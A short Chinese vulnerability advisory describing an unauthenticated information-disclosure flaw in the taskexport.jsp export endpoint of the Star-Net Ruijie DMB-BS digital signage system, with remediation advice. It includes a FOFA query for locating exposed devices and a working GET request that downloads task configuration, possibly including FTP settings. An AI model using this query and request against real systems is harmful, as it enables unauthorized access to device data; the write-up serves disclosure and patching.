## 星网锐捷 DMB-BS taskexport.jsp 信息泄露漏洞

## 漏洞描述
星网锐捷 DMB-BS 数字标牌系统的 `taskexport.jsp` 接口未对访问进行权限校验，攻击者可在未登录情况下直接下载任务配置，导致设备任务内容及相关敏感信息泄露。

## 影响版本
- 星网锐捷 DMB-BS 数字标牌系统（版本待补充）

## 网络空间测绘
```
fofa: app="STAR_NET-数字标牌系统"
```

## 漏洞复现
```
GET /dmb/out/taskexport.jsp?taskcode HTTP/1.1
Host: <target ip>
```

若接口直接返回 XML/JSON 任务数据，即说明存在信息泄露风险。

## 修复建议
- 为导出接口增加登录校验与操作审计
- 针对下载数据进行脱敏，避免泄露 FTP 等后台配置

## 参考
- 社区情报汇总

